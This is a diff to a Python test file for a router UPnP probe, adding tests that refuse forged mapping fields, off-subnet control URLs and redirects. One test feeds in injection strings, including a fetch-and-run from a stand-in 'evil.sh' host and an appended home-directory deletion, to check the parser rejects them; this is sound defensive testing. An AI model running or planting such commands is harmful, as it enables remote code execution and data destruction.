@@ -6,6 +6,7 @@ needs a network - the same approach as the ARP fixtures in
 test_scan_and_store.py.
 """
 
+import contextlib
 import http.server
 import ipaddress
 import threading
@@ -214,6 +215,18 @@ def test_non_numeric_ports_degrade_to_zero_rather_than_raising():
     assert m.internal_port == 0
 
 
+def test_an_internal_client_that_is_not_an_address_is_not_a_mapping():
+    """This field is rendered into a command the report says to paste.
+
+    The router is not trusted input, and `ping -c1 $(...)` in a block a reader
+    has been told to run is not a typo, it is the whole attack. UPnP requires an
+    address here, so anything else is refused rather than sanitised downstream.
+    """
+    for client in ("$(curl evil.sh|sh)", "192.168.1.23; rm -rf ~", "router.local"):
+        response = MAPPING_RESPONSE.replace("192.168.1.23", client)
+        assert upnp.parse_mapping(response) is None
+
+
 # --- enumeration ------------------------------------------------------------
 
 
@@ -296,19 +309,62 @@ class _FakeIGD(http.server.BaseHTTPRequestHandler):
         self._send(ENTRY.format(**self.entries[index]))
 
 
-def test_probe_gateway_walks_description_then_soap_over_real_sockets():
-    server = http.server.HTTPServer(("127.0.0.1", 0), _FakeIGD)
+@contextlib.contextmanager
+def _fake_router(handler):
+    """Serve `handler` on loopback, yielding the SSDP reply that points at it."""
+    server = http.server.HTTPServer(("127.0.0.1", 0), handler)
     threading.Thread(target=server.serve_forever, daemon=True).start()
     port = server.server_address[1]
-    reply = f"HTTP/1.1 200 OK\r\nLOCATION: http://127.0.0.1:{port}/rootDesc.xml\r\n\r\n"
     try:
-        gateway = upnp.probe_gateway("127.0.0.0/8", search=lambda timeout: [reply])
+        yield f"HTTP/1.1 200 OK\r\nLOCATION: http://127.0.0.1:{port}/rootDesc.xml\r\n\r\n"
     finally:
         server.shutdown()
 
-    assert gateway.control_url == f"http://127.0.0.1:{port}/ctl/IPConn"
+
+def test_probe_gateway_walks_description_then_soap_over_real_sockets():
+    with _fake_router(_FakeIGD) as reply:
+        gateway = upnp.probe_gateway("127.0.0.0/8", search=lambda timeout: [reply])
+
+    assert gateway.control_url.endswith("/ctl/IPConn")
     assert [m.external_port for m in gateway.mappings] == [32400, 8080]
     assert gateway.mappings[1].internal_client == "127.0.0.9"
+
+
+# The LOCATION check is only worth as much as the hop after it. A description
+# reached through a checked URL is still written by whoever answered, and it
+# gets to name both where we go next and what we print.
+
+
+class _AbsoluteControlURL(_FakeIGD):
+    """A description naming a controlURL outside the audited subnet."""
+
+    def do_GET(self):
+        self._send(
+            DESCRIPTION.replace(
+                "<controlURL>/ctl/IPConn</controlURL>",
+                "<controlURL>http://93.184.216.34/ctl</controlURL>",
+            )
+        )
+
+
+class _RedirectsAway(_FakeIGD):
+    """A description URL that 302s off the network."""
+
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header("Location", "http://93.184.216.34/rootDesc.xml")
+        self.end_headers()
+
+
+def test_a_control_url_outside_the_subnet_is_refused():
+    """urljoin lets an absolute controlURL discard the base URL entirely."""
+    with _fake_router(_AbsoluteControlURL) as reply:
+        assert upnp.probe_gateway("127.0.0.0/8", search=lambda timeout: [reply]) is None
+
+
+def test_a_redirect_off_the_network_is_not_followed():
+    with _fake_router(_RedirectsAway) as reply:
+        assert upnp.probe_gateway("127.0.0.0/8", search=lambda timeout: [reply]) is None
 
 
 def test_probe_gateway_ignores_a_forged_reply_pointing_off_network():
